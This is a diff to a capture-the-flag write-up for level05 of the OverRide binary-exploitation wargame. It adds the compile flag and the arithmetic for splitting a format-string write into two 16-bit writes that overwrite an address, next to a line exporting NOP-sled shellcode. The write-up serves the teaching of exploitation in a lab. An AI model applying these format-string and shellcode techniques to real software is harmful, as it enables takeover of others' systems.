@@ -57,7 +57,7 @@ level05@OverRide:/tmp$ export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x6a\
 
 ## Find Shellcode Address
 
-Using a small helper program (`main.c`, compiled in 32-bit mode):
+Using a small helper program (`main.c`, compiled in 32-bit mode (gcc -m32 main.c)):
 
 ```bash
 level05@OverRide:/tmp$ ./a.out
@@ -85,8 +85,8 @@ Using a probing payload such as `AAAA` + ` %p` repeated, the format-string write
 
 To avoid printing billions of characters, write the target address in two 16-bit chunks:
 
-- first write to `0x080497e0`,
-- second write to `0x080497e2`.
+- first write 0xd890 = 55440 to `0x080497e0` (with the adress in front we have then 55440 - 8 = 55432 padding),
+- second write 0xffff =  65535 to `0x080497e2` (but there already is 55440 char printed, so we have 65535 − 55440 = 10095).
 
 Payload used:
 
